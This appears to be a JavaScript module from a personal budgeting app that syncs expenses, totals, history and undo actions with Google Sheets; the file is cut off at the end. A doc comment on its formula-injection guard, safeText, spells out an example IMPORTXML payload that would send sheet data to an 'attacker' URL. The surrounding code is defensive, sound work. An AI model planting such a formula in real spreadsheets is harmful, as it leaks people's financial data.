// sheetId is passed dynamically to every function — no module-level constant

import { getCustomCategories, removeCustomCategory, upsertCustomCategory } from './customCategories.js';
import { BUILT_IN_SHEET_MAP } from './fetchDetail.js';
import { enqueue } from './offlineQueue.js';

// Merge static SHEET_MAP with any user-created categories stored in localStorage
export function getEffectiveSheetMap() {
  return { ...SHEET_MAP, ...getCustomCategories() };
}

// Cache which spreadsheets already have a History sheet this session
const _historyReady = new Set();

export const SHEET_MAP = {
  'Grocery':       { sheet: 'Grocery',       descCol: 2, amtCol: 3,  uuidStartCol: 4  },
  'Misc':          { sheet: 'Misc',          descCol: 2, amtCol: 3,  uuidStartCol: 4  },
  'Eating Out':    { sheet: 'Eating Out',    descCol: 2, amtCol: 3,  uuidStartCol: 4  },
  'Travel':        { sheet: 'Travel',        descCol: 2, amtCol: 3,  uuidStartCol: 4  },
  'Entertainment': { sheet: 'Entertainment', descCol: 2, amtCol: 3,  uuidStartCol: 4  },
  'Thakkali':      { sheet: 'Thakkali',      descCol: 2, amtCol: 3,  uuidStartCol: 4  },
  'Investment':    { sheet: 'Investment',    descCol: 2, amtCol: 3,  uuidStartCol: 4  },
  'Car Payments':  { sheet: 'Car Payments',  descCol: 2, amtCol: 3,  uuidStartCol: 4  },
  'Utilities':     { sheet: 'Utilities',     descCol: 2, amtCol: 3,  uuidStartCol: 4  },
  'Utilties':      { sheet: 'Utilities',     descCol: 2, amtCol: 3,  uuidStartCol: 4  },
  'Rent':          { sheet: 'Rent',          descCol: 2, amtCol: 3,  uuidStartCol: 4  },
  'Health':        { sheet: 'Health',        descCol: 2, amtCol: 3,  uuidStartCol: 4  },
  'Furniture':     { sheet: 'Furniture',     descCol: 2, amtCol: 3,  uuidStartCol: 4  },
  'Holiday':       { sheet: 'Holiday',       descCol: 2, amtCol: 3,  uuidStartCol: 4  },
  'Wi-Fi':         { sheet: 'Wi-Fi',         descCol: 2, amtCol: 3,  uuidStartCol: 4  },
};

export const CATEGORIES = [
  'Grocery', 'Eating Out', 'Misc', 'Travel', 'Thakkali', 'Entertainment',
  'Investment', 'Car Payments', 'Utilities', 'Rent', 'Health', 'Furniture', 'Holiday', 'Wi-Fi',
];

const colLetter = (i) => String.fromCharCode(65 + i);

/**
 * Force a value to be treated as literal text by Google Sheets, even when the
 * cell is written with valueInputOption=USER_ENTERED. Cells starting with
 * `= + - @ \t \r \n` would otherwise be interpreted as formulas — a vendor
 * name like `=IMPORTXML("https://attacker/?d="&Totals!A1:Z30,"/x")` would
 * exfiltrate sheet data when the cell loads. Prefixing with a single quote
 * tells Sheets "this is plain text"; the apostrophe is hidden in the UI and
 * stripped on read.
 *
 * Pass through non-strings and empty strings unchanged so formula and numeric
 * writes are unaffected.
 */
export function safeText(value) {
  if (typeof value !== 'string' || value.length === 0) return value;
  const c = value.charCodeAt(0);
  // = + - @  CR LF TAB
  if (c === 0x3d || c === 0x2b || c === 0x2d || c === 0x40 ||
      c === 0x0d || c === 0x0a || c === 0x09) {
    return "'" + value;
  }
  return value;
}

// Escape an identifier interpolated inside a Sheets formula sheet-ref like
// `='${name}'!F1`. A stray apostrophe would close the ref early; doubling it
// is the documented Sheets escape.
function escapeSheetRef(name) {
  return String(name).replace(/'/g, "''");
}

// Escape an identifier interpolated inside a formula string literal like
// `=SUMIF(..., "${name}", ...)`. Sheets escapes `"` as `""`.
function escapeFormulaString(name) {
  return String(name).replace(/"/g, '""');
}

// ─── Date utilities ───────────────────────────────────────────────────────────

/** Returns today as YYYY-MM-DD */
export function todayIso() {
  return new Date().toISOString().slice(0, 10);
}

/** Formats a YYYY-MM-DD string as "May 23 2026" */
export function formatTxDate(dateStr) {
  if (!dateStr) return '';
  try {
    const m = String(dateStr).match(/^(\d{4})-(\d{2})-(\d{2})$/);
    if (m) {
      return new Date(Number(m[1]), Number(m[2]) - 1, Number(m[3]))
        .toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })
        .replace(',', '');
    }
    return new Date(dateStr).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }).replace(',', '');
  } catch { return String(dateStr); }
}

/** Normalises statement date strings (MM/DD/YYYY or YYYY-MM-DD) → YYYY-MM-DD */
export function normalizeStatementDate(dateStr) {
  if (!dateStr) return null;
  const mdy = String(dateStr).match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})$/);
  if (mdy) return `${mdy[3]}-${mdy[1].padStart(2, '0')}-${mdy[2].padStart(2, '0')}`;
  if (/^\d{4}-\d{2}-\d{2}$/.test(String(dateStr))) return String(dateStr);
  return null;
}

// ─── Schema detection (v1 vs v2) ─────────────────────────────────────────────
// v2 sheets have "Date" as the third header column (C1).
// v1: A=Month B=Year C=Description D=Amount  E+=UUIDs  (SUM at F1)
// v2: A=Month B=Year C=Date       D=Description E=Amount F+=UUIDs (SUM at F1)

function detectV2(values) {
  return Array.isArray(values) && Array.isArray(values[0]) &&
    String(values[0][2] || '').trim() === 'Date';
}

// ─── Detail-row cache (Item 12) ───────────────────────────────────────────────

const _detailCache = new Map(); // `${sheetId}:${cat}` → { data, ts }
const DETAIL_CACHE_TTL = 2 * 60 * 1000; // 2 min

export function invalidateDetailCache(sheetId, categoryName) {
  if (categoryName) {
    _detailCache.delete(`${sheetId}:${categoryName}`);
  } else {
    for (const k of [..._detailCache.keys()]) {
      if (k.startsWith(sheetId + ':')) _detailCache.delete(k);
    }
  }
}

// ── Transaction UUID ──────────────────────────────────────────────────────────

/**
 * Generates a transaction UUID encoding the amount in cents + random suffix.
 * Format: tx_{cents}_{random8}  e.g. tx_2599_a3b4c5d6 for $25.99
 * Old rows without UUIDs fall back to fuzzy matching — fully backward compatible.
 */
function generateTransactionUUID(amount) {
  const cents  = Math.round(Math.abs(amount) * 100);
  const random = crypto.randomUUID().replace(/-/g, '').slice(0, 8);
  return `tx_${cents}_${random}`;
}

/** Returns the uuidStartCol for a config, defaulting to amtCol+1 if not set */
function uuidStart(config) {
  return config.uuidStartCol ?? (config.amtCol + 1);
}

// ─── Formula helpers ─────────────────────────────────────────────────────────

export function parseAmounts(rawValue) {
  if (rawValue === null || rawValue === undefined || rawValue === '') return [];
  const str = String(rawValue).replace(/[$,]/g, '').trim();
  if (str.startsWith('=')) {
    return str.slice(1).split('+').map(v => parseFloat(v.trim())).filter(v => !isNaN(v) && v > 0);
  }
  const num = parseFloat(str);
  return isNaN(num) || num <= 0 ? [] : [num];
}

export function buildFormula(amounts) {
  if (amounts.length === 0) return '';
  if (amounts.length === 1) return String(amounts[0]);
  return '=' + amounts.join('+');
}

// ─── Low-level API ────────────────────────────────────────────────────────────

async function apiFetch(sheetId, path, options = {}) {
  const res = await fetch(`https://sheets.googleapis.com/v4/spreadsheets/${sheetId}${path}`, options);
  if (!res.ok) {
    // Don't expose raw API errors — they can leak sheet structure/IDs
    const status = res.status;
    if (status === 401 || status === 403) throw new Error('Access denied. Please sign in again.');
    if (status === 404) throw new Error('Spreadsheet not found. Please check your setup.');
    if (status === 429) throw new Error('Too many requests. Please wait a moment.');
    throw new Error('Failed to save. Please try again.');
  }
  return res.json();
}

async function fetchRaw(sheetId, sheetName, accessToken) {
  // Use an explicit large range instead of just the sheet name.
  // This bypasses Google Sheets Table "managed range" — cleared rows inside
  // a table are returned as [] instead of being silently omitted.
  const range = encodeURIComponent(`'${sheetName}'!A1:Z200`);
  const json = await apiFetch(sheetId, `/values/${range}?valueRenderOption=FORMULA`, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  return json.values || [];
}

async function writeCell(sheetId, sheetName, row, col, value, accessToken) {
  const cell = `${colLetter(col)}${row}`;
  const range = encodeURIComponent(`'${sheetName}'!${cell}`);
  await apiFetch(sheetId, `/values/${range}?valueInputOption=USER_ENTERED`, {
    method: 'PUT',
    headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ values: [[value]] }),
  });
}

/** Truly clear a full row (A→endCol) using batchClear so cells are empty, not empty-string */
async function clearRowRange(sheetId, sheetName, rowIndex, endColIndex, accessToken) {
  const range = `'${sheetName}'!A${rowIndex}:${colLetter(endColIndex)}${rowIndex}`;
  await apiFetch(sheetId, '/values:batchClear', {
    method: 'POST',
    headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ ranges: [range] }),
  });
}

// ─── Totals helpers ───────────────────────────────────────────────────────────

export async function fetchTotalsForEdit(sheetId, accessToken) {
  const range = encodeURIComponent('Totals!A1:J30');
  const json = await apiFetch(sheetId, `/values/${range}?valueRenderOption=UNFORMATTED_VALUE`, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const values = json.values || [];
  return values.map((row, i) => ({
    rowNum: i + 1,
    row: Array(10).fill(null).map((_, j) => row[j] ?? null),
  }));
}

export async function writeSalary(sheetId, salary, accessToken) {
  const rows = await fetchTotalsForEdit(sheetId, accessToken);
  const salaryRow = rows.find(r => r.row[5] && String(r.row[5]).toLowerCase().includes('salary received'));
  if (!salaryRow) throw new Error('Salary row not found in Totals');
  await writeCell(sheetId, 'Totals', salaryRow.rowNum, 6, salary, accessToken);
  await appendHistoryEntry(sheetId, accessToken, {
    action: 'Budget Updated',
    category: 'Salary',
    amount: salary,
    details: `Salary set to $${Number(salary).toFixed(2)}`,
  });
}

export async function updateCategoryBudget(sheetId, accessToken, { rowNum, budget, categoryName }) {
  // C column stores the remaining formula: ={budget}-B{rowNum}
  // Coerce budget to a number so a stringy value can't escape the formula.
  await writeCell(sheetId, 'Totals', rowNum, 2, `=${Number(budget) || 0}-B${rowNum}`, accessToken);
  await appendHistoryEntry(sheetId, accessToken, {
    action: 'Budget Updated',
    category: categoryName,
    amount: budget,
    details: `Budget set to $${Number(budget).toFixed(2)}`,
  });
}

export async function writeBudgetAmounts(sheetId, updates, accessToken) {
  for (const { rowNum, amount } of updates) {
    await writeCell(sheetId, 'Totals', rowNum, 2, amount, accessToken);
  }
}

export async function appendRandomExpenseNote(sheetId, vendorName, amount, accessToken) {
  const rows = await fetchTotalsForEdit(sheetId, accessToken);
  const notesRow = rows.find(r => r.row[5] && String(r.row[5]).toLowerCase().includes('left from salary'));
  if (!notesRow) return;
  const existing = String(notesRow.row[8] || '').trim();
  const entries = existing ? existing.split(',').map(e => e.trim()) : [];
  if (entries.some(e => e.toLowerCase() === vendorName.trim().toLowerCase())) return;
  const newText = existing ? `${existing}, ${vendorName}` : vendorName;
  await writeCell(sheetId, 'Totals', notesRow.rowNum, 8, safeText(newText), accessToken);
}

export async function removeRandomExpenseNote(sheetId, vendorName, accessToken) {
  const rows = await fetchTotalsForEdit(sheetId, accessToken);
  const notesRow = rows.find(r => r.row[5] && String(r.row[5]).toLowerCase().includes('left from salary'));
  if (!notesRow) return;
  const existing = String(notesRow.row[8] || '').trim();
  if (!existing) return;
  const filtered = existing.split(',').map(e => e.trim()).filter(e => e.toLowerCase() !== vendorName.trim().toLowerCase());
  await writeCell(sheetId, 'Totals', notesRow.rowNum, 8, safeText(filtered.join(', ')), accessToken);
}

export async function renameRandomExpenseNote(sheetId, oldName, newName, accessToken) {
  // Notes live in I4 — read it directly, replace old name, write back
  const range = encodeURIComponent("'Totals'!I4");
  const res = await apiFetch(sheetId, `/values/${range}`, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const existing = String(res?.values?.[0]?.[0] || '').trim();
  if (!existing) return;

  const updated = existing.split(',').map(e => {
    const trimmed = e.trim();
    return trimmed.toLowerCase() === oldName.trim().toLowerCase() ? newName.trim() : trimmed;
  }).join(', ');

  if (updated === existing) return;

  await apiFetch(sheetId, `/values/${range}?valueInputOption=USER_ENTERED`, {
    method: 'PUT',
    headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ values: [[safeText(updated)]] }),
  });
}

// ─── Non-Monthly Expenses ─────────────────────────────────────────────────────

const NON_MONTHLY_SHEET = 'Non-Monthly Expenses';
const _nonMonthlyReady = new Set();

async function ensureNonMonthlySheet(sheetId, accessToken) {
  if (_nonMonthlyReady.has(sheetId)) return;
  const meta = await apiFetch(sheetId, '?fields=sheets.properties.title', {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const exists = (meta.sheets || []).some(s => s.properties?.title === NON_MONTHLY_SHEET);
  if (!exists) {
    await apiFetch(sheetId, ':batchUpdate', {
      method: 'POST',
      headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ requests: [{ addSheet: { properties: { title: NON_MONTHLY_SHEET } } }] }),
    });
    const headerRange = encodeURIComponent(`'${NON_MONTHLY_SHEET}'!A1:C1`);
    await apiFetch(sheetId, `/values/${headerRange}?valueInputOption=RAW`, {
      method: 'PUT',
      headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ values: [['Vendor', 'Amount', 'Date']] }),
    });
  }
  _nonMonthlyReady.add(sheetId);
}

/** Returns all non-monthly items for this month: [{ rowIndex, vendor, amount }] */
export async function fetchNonMonthlyItems(sheetId, accessToken) {
  try {
    await ensureNonMonthlySheet(sheetId, accessToken);
    const range = encodeURIComponent(`'${NON_MONTHLY_SHEET}'!A1:C200`);
    const json = await apiFetch(sheetId, `/values/${range}?valueRenderOption=UNFORMATTED_VALUE`, {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    const rows = json.values || [];
    return rows.slice(1) // skip header
      .map((row, i) => ({ rowIndex: i + 2, vendor: row[0] || '', amount: Number(row[1]) || 0 }))
      .filter(r => r.vendor);
  } catch { return []; }
}

/** Mark an expense as non-monthly — appends a row (or updates if vendor already exists) */
export async function markNonMonthly(sheetId, accessToken, vendor, amount) {
  try {
    await ensureNonMonthlySheet(sheetId, accessToken);
    const existing = await fetchNonMonthlyItems(sheetId, accessToken);
    const match = existing.find(r => r.vendor.toLowerCase() === vendor.toLowerCase());

    const date = new Date().toISOString().split('T')[0]; // YYYY-MM-DD
    if (match) {
      // Update existing row's amount
      const range = encodeURIComponent(`'${NON_MONTHLY_SHEET}'!A${match.rowIndex}:C${match.rowIndex}`);
      await apiFetch(sheetId, `/values/${range}?valueInputOption=USER_ENTERED`, {
        method: 'PUT',
        headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ values: [[safeText(vendor), amount, date]] }),
      });
    } else {
      // Find next empty row
      const nextRow = existing.length + 2; // +1 header +1 for 1-index
      const range = encodeURIComponent(`'${NON_MONTHLY_SHEET}'!A${nextRow}:C${nextRow}`);
      await apiFetch(sheetId, `/values/${range}?valueInputOption=USER_ENTERED`, {
        method: 'PUT',
        headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ values: [[safeText(vendor), amount, date]] }),
      });
    }
  } catch (e) { console.warn('markNonMonthly failed:', e); }
}

/** Remove a vendor from the non-monthly list */
export async function unmarkNonMonthly(sheetId, accessToken, vendor) {
  try {
    const existing = await fetchNonMonthlyItems(sheetId, accessToken);
    const match = existing.find(r => r.vendor.toLowerCase() === vendor.toLowerCase());
    if (!match) return;
    const range = encodeURIComponent(`'${NON_MONTHLY_SHEET}'!A${match.rowIndex}:C${match.rowIndex}`);
    await apiFetch(sheetId, `/values/${range}:clear`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${accessToken}` },
    });
  } catch (e) { console.warn('unmarkNonMonthly failed:', e); }
}

/** Rename a vendor in the non-monthly list when they are renamed in the detail sheet */
export async function renameNonMonthly(sheetId, accessToken, oldVendor, newVendor) {
  try {
    const existing = await fetchNonMonthlyItems(sheetId, accessToken);
    const match = existing.find(r => r.vendor.toLowerCase() === oldVendor.toLowerCase());
    if (!match) return;
    const range = encodeURIComponent(`'${NON_MONTHLY_SHEET}'!A${match.rowIndex}`);
    await apiFetch(sheetId, `/values/${range}?valueInputOption=RAW`, {
      method: 'PUT',
      headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ values: [[newVendor]] }),
    });
  } catch (e) { console.warn('renameNonMonthly failed:', e); }
}

/**
 * One-time migration: reads vendor names from the legacy Totals I4 cell,
 * looks up each vendor's total across all category detail sheets, then
 * writes them into the new Non-Monthly Expenses sheet.
 * Safe to call multiple times — bails out early if the sheet already has data.
 */
export async function migrateNonMonthlyFromI4(sheetId, accessToken) {
  // Only migrate if sheet is currently empty
  const existing = await fetchNonMonthlyItems(sheetId, accessToken);
  if (existing.length > 0) return; // already populated

  // Read Totals sheet to find the old I4 value (column I = index 8 of "Left from Salary" row)
  const range = encodeURIComponent("'Totals'!A1:J30");
  const json = await apiFetch(sheetId, `/values/${range}?valueRenderOption=UNFORMATTED_VALUE`, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const totalsRows = json.values || [];
  const notesRow = totalsRows.find(r => r[5] && String(r[5]).toLowerCase().includes('left from salary'));
  const i4Value = String(notesRow?.[8] || '').trim();
  if (!i4Value) return; // nothing to migrate

  const vendorNames = i4Value.split(',').map(v => v.trim()).filter(Boolean);
  if (vendorNames.length === 0) return;

  // Search all category detail sheets to resolve vendor → amount
  const categories = getAllCategoryNames();
  const vendorAmounts = {};

  await Promise.allSettled(
    categories.map(async cat => {
      try {
        const rows = await fetchDetailRows(cat, accessToken, sheetId);
        for (const row of rows) {
          for (const vendorName of vendorNames) {
            if (fuzzyNamesMatch(row.description, vendorName)) {
              const total = row.amounts.reduce((a, b) => a + b, 0);
              if (total > 0 && !vendorAmounts[vendorName]) {
                vendorAmounts[vendorName] = total;
              }
            }
          }
        }
      } catch { /* skip failed categories */ }
    })
  );

  // Write each vendor to the Non-Monthly sheet (amount 0 if not found in detail sheets)
  for (const vendorName of vendorNames) {
    await markNonMonthly(sheetId, accessToken, vendorName, vendorAmounts[vendorName] ?? 0);
  }
}

// ─── History ──────────────────────────────────────────────────────────────────

async function ensureHistorySheet(sheetId, accessToken) {
  if (_historyReady.has(sheetId)) return;
  const meta = await apiFetch(sheetId, '?fields=sheets.properties.title', {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const exists = (meta.sheets || []).some(s => s.properties?.title === 'History');
  if (!exists) {
    await apiFetch(sheetId, ':batchUpdate', {
      method: 'POST',
      headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ requests: [{ addSheet: { properties: { title: 'History' } } }] }),
    });
    const range = encodeURIComponent("'History'!A1:H1");
    await apiFetch(sheetId, `/values/${range}?valueInputOption=RAW`, {
      method: 'PUT',
      headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ values: [['Timestamp', 'Action', 'Category', 'Vendor', 'Amount', 'Details', 'Reserved', 'User', 'UUID']] }),
    });
  }
  _historyReady.add(sheetId);
}

export async function appendHistoryEntry(sheetId, accessToken, {
  action, category = '', vendor = '', amount = null, details = '', uuid = '', txDate = '',
}) {
  try {
    await ensureHistorySheet(sheetId, accessToken);
    const timestamp = new Date().toISOString();
    let userName = '';
    try {
      const raw = sessionStorage.getItem('budget_auth') || localStorage.getItem('budget_auth') || '{}';
      userName = JSON.parse(raw).name || '';
    } catch { /* ignore */ }
    // Columns: A=Timestamp B=Action C=Category D=Vendor E=Amount F=Details G=(reserved) H=User I=UUID J=TxDate
    const row = [
      timestamp,
      safeText(action || ''),
      safeText(category || ''),
      safeText(vendor || ''),
      amount ?? '',
      safeText(details || ''),
      '',
      safeText(userName),
      uuid || '',
      txDate || '',
    ];

    // Use an explicit PUT to a calculated row number rather than the append API,
    // so all 8 columns are guaranteed to land in the correct cells.
    const colARange = encodeURIComponent("'History'!A:A");
    const colAData = await apiFetch(sheetId, `/values/${colARange}`, {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    const nextRow = (colAData.values || []).length + 1;
    const writeRange = encodeURIComponent(`'History'!A${nextRow}:J${nextRow}`);
    await apiFetch(sheetId, `/values/${writeRange}?valueInputOption=USER_ENTERED`, {
      method: 'PUT',
      headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ values: [row] }),
    });
  } catch (e) {
    console.warn('appendHistoryEntry failed (non-fatal):', e);
    /* never block the main operation */
  }
}

export async function fetchHistory(sheetId, accessToken) {
  try {
    const range = encodeURIComponent("'History'!A:J");
    const json = await apiFetch(sheetId, `/values/${range}?valueRenderOption=UNFORMATTED_VALUE`, {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    const rows = json.values || [];
    if (rows.length <= 1) return [];
    return rows.slice(1).map((row, i) => ({
      id:        i,
      timestamp: row[0] || '',
      action:    row[1] || '',
      category:  row[2] || '',
      vendor:    row[3] || '',
      amount:    row[4] !== undefined && row[4] !== '' ? Number(row[4]) : null,
      details:   row[5] || '',
      user:      row[7] || '',
      uuid:      row[8] || '',
      txDate:    row[9] || '',
    }))
    .filter(e => e.action)
    .reverse();
  } catch {
    return [];
  }
}

// ─── Undo (writes directly — no secondary history entries) ───────────────────

export async function undoHistoryEntry(sheetId, accessToken, entry) {
  const { action, category, vendor, amount, details } = entry;

  if (action === 'Added' || action === 'Receipt Scan') {
    // Delete the vendor row entirely — batchClear so the row is reusable
    const rows = await fetchDetailRows(category, accessToken, sheetId);
    const row = rows.find(r => r.description.toLowerCase() === vendor.toLowerCase());
    if (row) {
      const config = SHEET_MAP[category];
      if (config) {
        await clearRowRange(sheetId, config.sheet, row.rowIndex, config.amtCol, accessToken);
      }
      // Non-monthly tracking via UserSettings only
    }

  } else if (action === 'Updated') {
    // Remove the specific amount that was added
    const rows = await fetchDetailRows(category, accessToken, sheetId);
    const row = rows.find(r => r.description.toLowerCase() === vendor.toLowerCase());
    if (row && amount != null) {
      const idx = row.amounts.findIndex(a => Math.abs(a - amount) < 0.005);
      const newAmounts = idx >= 0 ? row.amounts.filter((_, i) => i !== idx) : row.amounts;
      const config = SHEET_MAP[category];
      if (config) {
        if (newAmounts.length === 0) {
          await clearRowRange(sheetId, config.sheet, row.rowIndex, config.amtCol, accessToken);
          // Non-monthly tracking via UserSettings only
        } else {
          await writeCell(sheetId, config.sheet, row.rowIndex, config.amtCol, buildFormula(newAmounts), accessToken);
        }
      }
    }

  } else if (action === 'Edited') {
    // Restore the previous amount stored in details as "was: $X.XX"
    const match = details?.match(/was:\s*\$?([\d.]+)/);
    if (match) {
      const prevAmount = parseFloat(match[1]);
      const rows = await fetchDetailRows(category, accessToken, sheetId);
      const row = rows.find(r => r.description.toLowerCase() === vendor.toLowerCase());
      if (row) {
        const config = SHEET_MAP[category];
        if (config) await writeCell(sheetId, config.sheet, row.rowIndex, config.amtCol, prevAmount, accessToken);
      }
    }

  } else if (action === 'Deleted') {
    // Re-add the expense at the correct row
    if (amount != null) {
      const config = SHEET_MAP[category];
      if (config) {
        const values = await fetchRaw(sheetId, config.sheet, accessToken);
        const dataRows = values.slice(1);
        const found = dataRows.findIndex(r => {
          const desc = r[config.descCol];
          return desc && String(desc).trim().toLowerCase() === vendor.toLowerCase();
        });
        if (found >= 0) {
          // Vendor still exists (partial delete) — append amount
          const sheetRow = found + 2;
          const existing = parseAmounts(dataRows[found][config.amtCol] ?? '');
          const newUUID = generateTransactionUUID(amount);
          await writeCell(sheetId, config.sheet, sheetRow, config.amtCol, buildFormula([...existing, amount]), accessToken);
          await writeCell(sheetId, config.sheet, sheetRow, uuidStart(config) + existing.length, newUUID, accessToken);
        } else {
          // Re-create the row — reuse the first empty slot (left by the delete) if possible,
          // otherwise use values:append so the write stays within the sheet's table boundary.
          const now = new Date();
          const newUUID = generateTransactionUUID(amount);
          const uuidCol = uuidStart(config);
          const newRow = Array(uuidCol + 1).fill('');
          newRow[0] = now.toLocaleString('en-US', { month: 'short' });
          newRow[1] = now.getFullYear();
          newRow[config.descCol] = safeText(vendor);
          newRow[config.amtCol]  = amount;
          newRow[uuidCol]        = newUUID;

          let targetRow = -1;
          for (let i = 0; i < dataRows.length; i++) {
            const desc = dataRows[i][config.descCol];
            const amt  = dataRows[i][config.amtCol];
            const hasDesc = desc && String(desc).trim() !== '';
            const hasAmt  = amt  && String(amt).trim()  !== '';
            if (!hasDesc && !hasAmt) { targetRow = i + 2; break; }
          }

          if (targetRow >= 0) {
            // Write into the empty slot left by the delete
            const range = encodeURIComponent(`'${config.sheet}'!A${targetRow}:${colLetter(uuidCol)}${targetRow}`);
            await apiFetch(sheetId, `/values/${range}?valueInputOption=USER_ENTERED`, {
              method: 'PUT',
              headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
              body: JSON.stringify({ values: [newRow] }),
            });
          } else {
            // No empty slot found — append so we never write outside the table boundary
            const appendRange = encodeURIComponent(`'${config.sheet}'!A:${colLetter(uuidCol)}`);
            await apiFetch(sheetId, `/values/${appendRange}:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS`, {
              method: 'POST',
              headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
              body: JSON.stringify({ values: [newRow] }),
            });
          }
        }
      }
    }

  } else if (action === 'Renamed') {
    // Parse "OldName → NewName" and rename back
    const match = details?.match(/^(.+?)\s*→\s*(.+)$/);
    if (match) {
      const oldName = match[1].trim();
      const rows = await fetchDetailRows(category, accessToken, sheetId);
      const row = rows.find(r => r.description.toLowerCase() === vendor.toLowerCase());
      if (row) {
        const config = SHEET_MAP[category];
        if (config) await writeCell(sheetId, config.sheet, row.rowIndex, config.descCol, safeText(oldName), accessToken);
      }
    }

  } else if (action === 'Category Renamed') {
    // details = "OldName → NewName", category = newName — rename back
    const match = details?.match(/^(.+?)\s*→\s*(.+)$/);
    if (match) {
      const originalName = match[1].trim();
      const currentName  = match[2].trim();
      await renameCategory(sheetId, accessToken, { oldName: currentName, newName: originalName });
    }
  }

  // Log a single Undo entry
  await appendHistoryEntry(sheetId, accessToken, {
    action: 'Undo',
    category,
    vendor,
    amount,
    details: `Reverted: ${action}`,
  });
}

// ─── Read ─────────────────────────────────────────────────────────────────────

export async function fetchDetailRows(categoryName, accessToken, sheetId) {
  // Serve from cache if fresh (Item 12)
  const cacheKey = `${sheetId}:${categoryName}`;
  const cached = _detailCache.get(cacheKey);
  if (cached && Date.now() - cached.ts < DETAIL_CACHE_TTL) return cached.data;

  const config = getEffectiveSheetMap()[categoryName];
  if (!config) return [];

  // Try primary sheet name first; fall back to legacy name for historic sheets
  const LEGACY_FALLBACKS = {
    'Furniture': { sheet: 'Moving Expenses+Furniture', descCol: 10, amtCol: 11 },
  };

  let values = await fetchRaw(sheetId, config.sheet, accessToken);

  // If primary returned empty and a legacy fallback exists, try that
  if (values.length <= 1 && LEGACY_FALLBACKS[categoryName]) {
    const legacy = LEGACY_FALLBACKS[categoryName];
    const legacyValues = await fetchRaw(sheetId, legacy.sheet, accessToken);
    if (legacyValues.length > 1) {
      const result = [];
      const legacyUuidCol = uuidStart(legacy);
      legacyValues.slice(1).forEach((row, j) => {
        const desc = row[legacy.descCol];
        const rawAmt = row[legacy.amtCol];
        if (!desc || String(desc).trim() === '') return;
        const amounts = parseAmounts(rawAmt);
        if (amounts.length === 0) return;
        const uuids = amounts.map((_, i) => String(row[legacyUuidCol + i] || ''));
        result.push({ rowIndex: j + 2, description: String(desc), amounts, uuids, date: '', _v2: false });
      });
      _detailCache.set(cacheKey, { data: result, ts: Date.now() });
      return result;
    }
  }

  // Detect schema version from header row
  const isV2    = detectV2(values);
  const descCol = isV2 ? 3 : config.descCol;
  const amtCol  = isV2 ? 4 : config.amtCol;
  const uuidCol = isV2 ? 5 : uuidStart(config);
  const dateCol = isV2 ? 2 : -1;

  const result = [];
  values.slice(1).forEach((row, j) => {
    const desc   = row[descCol];
    const rawAmt = row[amtCol];
    if (!desc || String(desc).trim() === '') return;
    const amounts = isV2
      ? (() => { const n = parseFloat(String(rawAmt || '').replace(/[$,]/g, '')); return (!isNaN(n) && n > 0) ? [n] : []; })()
      : parseAmounts(rawAmt);
    if (amounts.length === 0) return;
    const uuids = amounts.map((_, i) => String(row[uuidCol + i] || ''));
    const date  = isV2 ? String(row[dateCol] || '').trim() : '';
    result.push({ rowIndex: j + 2, description: String(desc), amounts, uuids, date, _v2: isV2 });
  });

  _detailCache.set(cacheKey, { data: result, ts: Date.now() });
  return result;
}

/** Returns all current category names — static + any custom ones — at call time */
export function getAllCategoryNames() {
  return Object.keys(getEffectiveSheetMap());
}

// ─── Duplicate check ──────────────────────────────────────────────────────────

/**
 * Fuzzy name match — handles bank truncation and minor variations.
 * e.g. "Amazon" matches "Amazon Marketplace", "Mayuri Foods" matches "Mayuri Foods International"
 */
export function fuzzyNamesMatch(a, b) {
  if (!a || !b) return false;
  const clean = s => s.toLowerCase().trim().replace(/[^a-z0-9\s]/g, '');
  const ca = clean(a);
  const cb = clean(b);
  if (ca === cb) return true;
  if (cb.includes(ca) || ca.includes(cb)) return true;
  // Word overlap: share at least one significant word (4+ chars)
  const words = s => s.split(/\s+/).filter(w => w.length >= 4);
  const wa = words(ca);
  const wb = words(cb);
  return wa.some(w => wb.some(x => x.includes(w) || w.includes(x)));
}

/**
 * Returns true if vendor + amount already exists in the category detail sheet.
 * Uses fuzzy name matching to catch bank name variations.
 */
export async function checkExistingExpense(category, vendor, amount, accessToken, sheetId) {
  try {
    const rows = await fetchDetailRows(category, accessToken, sheetId);
    return rows.some(row => {
      const amountMatch = row.amounts?.some(a => Math.abs(a - amount) < 0.05);
      if (!amountMatch) return false;
      return fuzzyNamesMatch(row.description, vendor);
    });
  } catch {
    return false; // if check fails, allow the save
  }
}

/**
 * Fetches all logged transactions for the given categories this month.
 * Used to find expenses that were logged but don't appear in an uploaded statement.
 */
export async function fetchAllLoggedTransactions(categories, accessToken, sheetId) {
  const results = [];
